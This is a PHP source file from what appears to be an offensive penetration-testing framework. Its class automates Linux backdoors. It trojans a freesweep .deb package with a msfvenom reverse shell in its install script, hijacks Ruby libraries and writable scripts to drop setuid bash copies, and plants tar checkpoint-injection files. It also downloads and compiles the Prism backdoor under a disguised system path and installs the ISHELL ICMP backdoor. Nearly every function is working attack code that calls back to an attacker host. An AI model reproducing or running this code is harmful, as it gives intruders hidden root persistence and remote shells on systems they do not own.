<?php 




class backdoor4linux extends check4linux8jobs{

  

    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);
    }
    
    
    
    public function backdoor_linux_fake_deb($attacker_ip,$attacker_port,$shell){
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre(".deb file" );
        $this->requette("echo '$this->root_passwd' | sudo -S apt-get download freesweep" );
        $this->requette("echo '$this->root_passwd' | sudo -S mv -v ./freesweep_0.90-2_amd64.deb $this->file_dir/" );
        $this->requette("dpkg -x $this->file_dir/freesweep_0.90-2_amd64.deb $this->file_dir/work" );
        $this->requette("mkdir $this->file_dir/work/DEBIAN" );
        $control = 'Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
Freesweep: is an implementation of the popular minesweeper game, where one tries to find all the mines without igniting any, based on hints given by the computer. Unlike most implementations of this game, Freesweep works in any visual text display - in Linux console, in an xterm, and in most text-based terminals currently in use.';
        $this->requette("echo '$control' | tee $this->file_dir/work/DEBIAN/control " );
        $postinst = '#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &';
        $this->requette("echo '$postinst' | tee $this->file_dir/work/DEBIAN/postinst " );
        $this->requette("chmod 755 $this->file_dir/work/DEBIAN/postinst" );
        $this->requette("msfvenom --payload  linux/x86/shell/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port X > $this->file_dir/work/usr/games/freesweep_scores" );
        $this->requette("dpkg-deb --build $this->file_dir/work/" );
        $this->requette("mv -v $this->file_dir/work.deb $this->file_dir/freesweep.deb" );
        $cmd1 = "nc -l -p $this->attacker_port -v -n";
        $cmd2 = "echo '$this->root_passwd' | sudo -S dpkg -i $this->file_dir/freesweep.deb";
        $this->exec_parallel($cmd1, $cmd2, 0 );
        $this->pause();
    }
    
    
    
    public function backdoor($stream,$lan_filepath){
        $obj_exec = new FILE($lan_filepath);
        
        $data = "file $obj_exec->file_path";
        $file_info = $this->req_str($stream,$data,$this->stream_timeout,"");
        // if ($this->file4writable($obj_jobs->file_path)){
        
        if ( $this->file4exist8path($stream,$lan_filepath) ){
            switch ($file_info) {
                // Bourne-Again shell script, ASCII text executable
                case (strstr($file_info,"Bourne-Again shell script, ASCII text executable")!==FALSE) :
                    $this->backdoor4ascii4bash($stream,$lan_filepath);
                    
                    break;
                    
                    
                case (strstr($file_info,"Ruby script, ASCII text executable")!==FALSE) :
                    $this->backdoor4ruby($stream,$lan_filepath);
                    break;
                    
                    
                case (strstr($file_info,"tar, ")!==FALSE) :
                    $this->backdoor4ascii4tar($stream,$lan_filepath);
                    break;
                    
                case (strstr($file_info,"ASCII text")!==FALSE) :
                    $this->backdoor4ascii4bash($stream,$lan_filepath);
                    break;
                    
                default:
                    break;
            }
        }
    }
    
    public function backdoor4ruby($stream,$lan_filepath){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_jobs = new FILE($lan_filepath);
        $data = "cat $obj_jobs->file_path | grep -i require ";
        $libs = $this->req_tab($stream,$data,$this->stream_timeout," | grep -i require | awk '{print $2}' | grep -Po \"[0-9a-z\_\-/]{1,}\"");
        
        
        //$libs = array("zip");
        
        foreach ($libs as $lib){
            $lib = trim($lib);
            if (!empty($lib)){
                $hashname = sha1($lib);
                
                $data = "gem which $lib  | grep '/'";
                $lib_path = $this->req_str($stream,$data,$this->stream_timeout,"| grep '/' | grep -Po \"^/[[:print:]]{1,}\"");
                
                
                $this->article("LIB", $lib);
                $this->article("LIB PATH", $lib_path);
                //var_dump($tmp);fgets(STDIN);
                $this->pause();
                
                $data = "ls -al $lib_path";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                $data = "chmod 777 $lib_path";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                $data = "ls -al $lib_path";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                $data = "ls -al /tmp/";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                $data = "echo '`cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname`' > $lib_path";
                //$data = "echo '$(cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname)' > $lib_path";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                if (strstr($minute, "*")) $seconds = "60";
                else $seconds = $minute;
                $this->article("Wait Seconds", $seconds);
                
                sleep($seconds);
                $this->pause();
                
                $data = "ls -al /tmp/";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                $data = "ls -al /tmp/$hashname";
                $this->req_str($stream,$data,$this->stream_timeout,"");
                $data = "/tmp/$hashname -p -c id";
                $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
                
                $this->pause();
                if (strstr($rst_id, "euid=")) {
                    $template_id = "/tmp/$hashname -p -c %ID%";
                    $templateB64_id = base64_encode($template_id);
                    $template_id_new = $this->spawn2shell8euid($template_id,$euid_name);
                    
                    
                    $this->pentest8id($stream,$template_id_new);
                    
                }
                
                
                
            }
        }
    }
    
    public function backdoor4ascii4tar($stream,$lan_filepath){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        // if ($this->file4writable($obj_jobs->file_path)){
        $filter = " | strings | grep \"tar\" | grep -Po \"tar \"";
        $check_tar = $this->req_str($stream,"cat $obj_jobs->file_path $filter ",$this->stream_timeout,$filter);
        
        if (!empty($check_tar)){
            $sha1_hash = sha1($obj_jobs->file_path);
            $template_id_test = "echo  \"%ID%\" > /tmp/$sha1_hash.sh && echo \"\" > \"--checkpoint-action=exec=sh /tmp/$sha1_hash.sh\" && echo \"\" > --checkpoint=1";
            
            $this->pentest8id($stream,$template_id_test);
            $this->pause();
        }
    }
    
    public function backdoor4ascii4bash($stream,$lan_filepath){
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->req_str($stream,"cat $obj_jobs->file_path",$this->stream_timeout,"");
        
        $tab_users_shell = $this->ip2users4shell();
        foreach ($tab_users_shell as $username){
            //sleep($minute*60);
            if (!$this->ip2root8db($this->ip2id)){
                $template_id_test = "echo '%ID%' > $obj_jobs->file_path && sudo -u $username $obj_jobs->file_path";
                
                $this->pentest8id($stream,$template_id_test);
                $this->pause();
            }
        }
    }
    
    
   
    public function backdoor4root($stream){
        $this->titre(__FUNCTION__);
        
        $sql_ip = "UPDATE IP SET ip2backdoor=1 WHERE $this->ip2where  ";
        $this->mysql_ressource->query($sql_ip);

        $this->backdoor4root2tcp4prism($stream);$this->pause(); // OK
        //$this->backdoor4root2icmp($stream);$this->pause(); //
        
         
        
        
    }
    
    
    
  

    public function backdoor8c2tcp2prism($sbin_path_hidden,$attacker_ip,$attacker_port){
        $filename = "$this->dir_c/backdoor8c2tcp2prism.c";
        $rev_id = file_get_contents($filename);
        $rev_id = str_replace("%FILE%", $sbin_path_hidden, $rev_id);
        $rev_id = str_replace("%IP%", $attacker_ip, $rev_id);
        $rev_id = str_replace("%PORT%", $attacker_port, $rev_id);
        return $rev_id;
    }
    
 
    
    public function backdoor4root2tcp4prism($stream){
        $this->ssTitre(__FUNCTION__);
        //https://github.com/andreafabrizi/prism
        $sbin_path_hidden = "/usr/sbin/lpinfo";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        $rev_id = $this->backdoor8c2tcp2prism($sbin_path_hidden, $attacker_ip, $attacker_port);
        $backdoor_name = "backdoor4root_prism";
        $this->str2file("",$rev_id, "$this->dir_tmp/$backdoor_name.c");

        $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
               
        if(!$this->file4exist8path($stream, "/tmp/$backdoor_name")){
        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "gcc -DDETACH -DNORENAME -Wall -s -o /tmp/$backdoor_name /tmp/$backdoor_name.c ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        }
        $data = "ls -al /tmp/$backdoor_name ";
        $this->req_str($stream,$data,$this->stream_timeout,"");

        $data = "ps -ef | grep $backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep $backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -ef | grep udevd";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep udevd";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        
        $data = "/tmp/$backdoor_name Inf0";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        $data = "/tmp/$backdoor_name &";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "socat - EXEC:\"/tmp/$backdoor_name\",pty,stderr,setsid,sigint,ctty,sane";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep udevd";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "ps -aux | grep /tmp/$backdoor_name";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->pause();
        $data = "/tmp/$backdoor_name &";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $template_shell = "echo '$this->root_passwd' | sudo -S python $this->dir_c/sendPacket.py $this->ip p4ssw0rd $attacker_ip $attacker_port '%SHELL%'";
        $templateB64_shell = base64_encode($template_shell);
        $lprotocol = 'T' ;
        $type = "server";
        $this->service4lan($template_shell, $templateB64_shell, $attacker_port, $lprotocol, $type);
        
    }
    
    
   
    
    
    public function backdoor4root2icmp($stream) {
        $this->titre(__FUNCTION__);
         
        $this->backdoor4root2icmp8client();
        $this->backdoor4root2icmp8server($stream);
        
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/bash";
        
        $cmd_rev = $this->rev8sh($attacker_ip, $attacker_port, $shell);
        $template_shell = "(echo '$this->root_passwd';sleep 3;echo '$cmd_rev';sleep 3;) | sudo -S /tmp/ISHELL-v0.2/ish -i 65535 -t 0 -p 1024 $this->target_ip";
        $templateB64_shell = base64_encode($template_shell);
        $lprotocol = 'T' ;
        $type = "server";
        $this->service4lan($template_shell, $templateB64_shell, $attacker_port, $lprotocol, $type);
        
    }
    
    
    public function backdoor4root2icmp8server($stream) {
        $this->ssTitre(__FUNCTION__);
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        $this->tcp2open4server($attacker_ip, $this->port_rfi);
        $file_path = "$this->dir_tmp/ISHELL-v0.2.tar.gz";
        if (!file_exists($file_path)) $this->requette("cp -v $this->dir_tools/Malwares/ISHELL-v0.2.tar.gz $file_path");
        
        $filepath = "/tmp/ISHELL-v0.2/ishd";
        if (!$this->file4exist8path($stream, $filepath)){
        $data = "wget http://$attacker_ip:$this->port_rfi/ISHELL-v0.2.tar.gz -O /tmp/ISHELL-v0.2.tar.gz";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "tar -xvf /tmp/ISHELL-v0.2.tar.gz -C /tmp ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cd /tmp/ISHELL-v0.2/; make linux";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        }
        $data = "/tmp/ISHELL-v0.2/ishd -i 65535 -t 0 -p 1024 &";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        

        
        
    }
    
    

    
    public function backdoor4root2icmp8client() {
        $this->ssTitre(__FUNCTION__);
        
        if (!file_exists("/tmp/ISHELL-v0.2/ish")){
        $this->requette("tar -xvzf $this->dir_tools/Malwares/ISHELL-v0.2.tar.gz -C /tmp");
        $this->requette("cd /tmp/ISHELL-v0.2/; make linux" );
        }
    }
    
    
 
    
}
?>